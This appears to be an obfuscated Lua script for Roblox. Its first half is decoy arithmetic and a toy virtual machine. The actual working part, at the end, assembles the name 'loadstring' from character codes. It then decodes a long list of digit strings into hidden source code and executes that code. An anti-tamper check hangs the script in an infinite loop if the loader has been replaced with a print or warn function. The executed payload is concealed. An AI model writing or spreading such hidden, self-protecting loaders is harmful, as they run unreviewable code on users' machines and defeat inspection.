local function a(b) return b + 2 end local function c(d) return d * 2 end local function e(f, g) return f - g end local function h(i, j) return i / j end local function k(l) return l ^ 2 end local function m(n) return n % 3 end local p = 5 local q = a(p) local r = c(q) local s = e(r, p) local t = h(s, p) local u = k(t) local v = m(u) local x = 10 local y = a(x) local z = e(y, 4) local w = c(z) local j1 = h(w, 3) local k1 = m(j1) local function l1() return p * q end local function l2() return e(r, s) end local function l3() return t + u end local function l4() return v - w end local z1 = l1() local z2 = l2() local z3 = l3() local z4 = l4() local t1 = a(z1) local t2 = c(z2) local t3 = e(z3, z4) local t4 = h(t1, t2) local t5 = m(t3) local function n1(x) return x * 4 end local function n2(y) return y + 5 end local function n3(z) return z - 10 end local result1 = n1(t5) local result2 = n2(result1) local result3 = n3(result2) local temp = result3 + 100 local final = temp / 10 local vm = {} vm.registers = {A = 0, B = 0, C = 0, D = 0} vm.memory = {} vm.stack = {} vm.pc = 1 vm.code = {} local function op_add(r1, r2) return r1 + r2 end local function op_sub(r1, r2) return r1 - r2 end local function op_mul(r1, r2) return r1 * r2 end local function op_div(r1, r2) if r2 == 0 then return 0 else return r1 / r2 end end local function dummy1(a, b) local c = a + b local d = a * b local e = c - d local f = h(c, b + 1) return f + d end local function dummy2(x) local y = x * 2 local z = x - y return z + a(x) end local instr_set = {} instr_set["ADD"] = function(reg, val) vm.registers[reg] = vm.registers[reg] + val end instr_set["SUB"] = function(reg, val) vm.registers[reg] = vm.registers[reg] - val end instr_set["MUL"] = function(reg, val) vm.registers[reg] = vm.registers[reg] * val end instr_set["DIV"] = function(reg, val) vm.registers[reg] = vm.registers[reg] / val end local program = { {"ADD", "A", 5}, {"MUL", "B", 3}, {"SUB", "C", 2}, {"DIV", "D", 4}, {"ADD", "A", 7}, {"MUL", "C", 2}, {"SUB", "B", 1}, {"DIV", "A", 2}, {"ADD", "D", 10}, {"SUB", "C", 3}, {"MUL", "B", 4}, {"DIV", "D", 2} } local function load_program(prog) for i = 1, #prog do vm.code[i] = prog[i] end end local function execute_program() for i = 1, #vm.code do local inst = vm.code[i] local op = inst[1] local reg = inst[2] local val = inst[3] if instr_set[op] then instr_set[op](reg, val) end end end local function vm_initialization() vm.registers.A = final vm.registers.B = p + x vm.registers.C = z1 vm.registers.D = t4 for i = 1, 50 do vm.stack[i] = (i * 3) % 7 end for i = 1, 100 do vm.memory[i] = i % 5 end end local function vm_loop() local count = 0 while count < 100 do vm.pc = vm.pc + 1 vm.registers.A = op_add(vm.registers.A, dummy1(count, vm.pc)) vm.registers.B = op_sub(vm.registers.B, dummy2(count)) vm.registers.C = op_mul(vm.registers.C, 1.001) vm.registers.D = op_div(vm.registers.D, 1.002) count = count + 1 end end local function auxiliary() local arr = {} for i = 1, 30 do arr[i] = i * a(i) - c(i) end local sum = 0 for i = 1, #arr do sum = sum + arr[i] end local prod = 1 for i = 1, #arr do prod = op_mul(prod, (arr[i] % 5 + 1)) end local mix = dummy1(sum, prod) for i = 1, 20 do mix = op_add(mix, dummy2(i)) end vm.registers.A = vm.registers.A + mix end vm_initialization() load_program(program) execute_program() vm_loop() auxiliary() local ______n_ = {x____zfl = {xqxxx___ = table.concat},zqxp__v_ = {nvxnq_z_ = loadstring},xfq_e_q_ = {__vI_I__ = tonumber},_x_xxxlI = {__p_lx_x = string.char},zpv_pq_I = { _I__vn__ = setmetatable}, qp__z_f_ = { xpe__f__ = nil} } local _fxn_np_ = ______n_.x____zfl.xqxxx___ local ze__xIe_ = ______n_.zqxp__v_.nvxnq_z_ local __v_x_v_ = ______n_.xfq_e_q_.__vI_I__ local pp_x_Ixx = ______n_._x_xxxlI.__p_lx_x local f_fpezp_ = ______n_.zpv_pq_I._I__vn__ local _xxxx___ = ______n_.qp__z_f_.xpe__f__ local _e__lnxx = pp_x_Ixx(108, 111, 97, 100, 115, 116, 114, 105, 110, 103) function e__x__f_(exq___p_) local luacrypt_so_tuff = "ts pmo icl dnt pmo wrd2foenem" local _nl____z = exq___p_ local qn_p__x_ = setclipboard local __f_qxq_ = toclipboard local function _____e_e(____x___) return function() return ____x___ end end local _ll__f_p = warn local function e_____lv(le_z_zn_) return _____e_e(le_z_zn_)() end local _f_q__vq = error local function __xn_l__() while true do end end local _____x__ = print local function __InIx__() return e_____lv(math.random(100, 999)) end local x_z_l_z_ = game local _ll____p = {ze__xIe_,x_z_l_z_,_____x__,_ll__f_p,_f_q__vq,qn_p__x_,__f_qxq_} if _ll____p[1] == _ll____p[3] or _ll____p[1] == _ll____p[4] or _ll____p[1] == _ll____p[5] or _ll____p[1] == _ll____p[6] or _ll____p[1] == _ll____p[7] then __xn_l__() end local function _IIpv__I(_zpneqq_) local function ___x_z__(_p_ln_lx) return pp_x_Ixx(__v_x_v_(_p_ln_lx, 2)) end __InIx__() local ___f_x__ = _zpneqq_:gsub("[^01]", "") return ___f_x__:gsub("(".. ("[01]"):rep(8) .. ")", ___x_z__) end local I_x___q_ = _IIpv__I(_nl____z) local sporty = game:GetService("Workspace") local function levfl_e_(zn____l_) local ___ef__e, x____fnv, _I__e_q_, _n_q_zI_ = "l", "o", "a", "d" local vpxxvI_p, __I___ve, ____I___, ____l_n_ = "s", "t", "r", "i" local pxl_xI__, __vv_vq_ = "n", "g" local function ______v_(...) local _x__z_vn, xp_I__n_ = {...}, "" for i = 1, #_x__z_vn do xp_I__n_ = xp_I__n_ .. _x__z_vn[i] end return xp_I__n_ end local qn_nl___ = ______v_(___ef__e, x____fnv, _I__e_q_, _n_q_zI_, vpxxvI_p, __I___ve, ____I___, ____l_n_, pxl_xI__, __vv_vq_) local xx_f___n = ("%s"):format(qn_nl___) local _q___n_f, _I_I__I_ = pcall(ze__xIe_(zn____l_)) local _q_v_l_f, pl__fp_q, _q__v_I_ = "__S___W___SG_SW_DGXZ__RS__Q____W_F___SX_F__XSF__XR", "G__W_GFV__XD____W_WWF___D_W_Q_FRFF____WQG____XZR_V", "_V__S_FSV_S_S_S__S__WD__ZGW_FW____F_X_____D___FQ_F" local ______nf = (2 * 5 / 10 + 3 - 3) ^ 1 if not _q___n_f then local __lxxz__ = { _q_v_l_f, pl__fp_q, _q__v_I_, ______nf } for i = 1, # __lxxz__ do __lxxz__[i] = __lxxz__[i] .. "_extra" end end return _I_I__I_ end levfl_e_(I_x___q_, ______n_.qp__z_f_.xpe__f__); __InIx__() local ezpzq_l_ = f_fpezp_( { __e__pI_ = { ______vq = { xxxxlI__, __p__fn_, _nxqvIv_ }, ___f__Ie = function() for _v_f_v_q = 1, 50 do local _ll__pxe = _v_f_v_q * 2 local _ln__f__ = {_v_f_v_q, _v_f_v_q * 10, _v_f_v_q * 100} end return ______n_.qp__z_f_.xpe__f__ end }, _l_pnpe_ = { [true] = { function() for _n_IIe__ = 1, 100 do local _z_nq_fz = _n_IIe__ * _n_IIe__ if _z_nq_fz > 100 then break end end end }, [false] = { { function() return false end }, function() for peIfn_v_ = 1, 10 do local qI___pIp = peIfn_v_ * 2 end end } } }, { __index = function(_, _xp_f__e) local plq_____ = "Lua Crypt1" if _xp_f__e == "print" then for ____xz__ = 1, 100 do local ln_____f = ____xz__ * ____xz__ + ____xz__ end return print elseif _xp_f__e == "warn" then for IplvxvxI = 1, 50 do local _z_vpI_e = IplvxvxI * 3 if _z_vpI_e == 150 then return warn end end end return ______n_.qp__z_f_.xpe__f__ end } ) end e__x__f_(_fxn_np_({'097336155463126447067295154537033224059643056354','062976163656122654129375067567176522049297073652','056394176357142534194996035693154963072659022342','057362127343122359199542033993044743042295056946','093779166955146273155552032276042769146574195526','054229062367137995156353139753066444156455047942','069774037644129663095367177564139665199529122657','033732049494152996094264192447136369146923124575','062354147725196472125657046492029966066392026326','024447124796175734049296079623024574043354164722','035329124255193793142647024629045934146667145294','027963167265139334179556029994177237079694092292','059932166677132679076475036343146952044532143275','099477123465167433067275025527075547174233025569','057272123254126625044662179536025433059257177394','037947124295172329079439176954159452157525067447','046479045762149222066454123222195724163435033757','074924196255162964023235066755024957154949166334','063449179296169345074494125999129577132244134953','056664142993172756094642196263149275055457195647','046449076232133439034563149492179977123244165925','049676167457152296196462056549096569193243096937','093429147573197975062939065632069924076692159355','036992127675193592129453047594172239199662133949','094954039537145396047792164735169249164274197264','063262176265053642122346076436073254053492156767','033967126249136479059243162347044432029673066543','059997144277174745076763165954099594136323064629','093476165932063334046329066399176672154722027567','029726162354129723033976099735149363072779046296','097344132943043452092454064247099927027966144569','077259135477149929192693079494037695199269022323','076435192539022237143549047956023946042295157623'}))
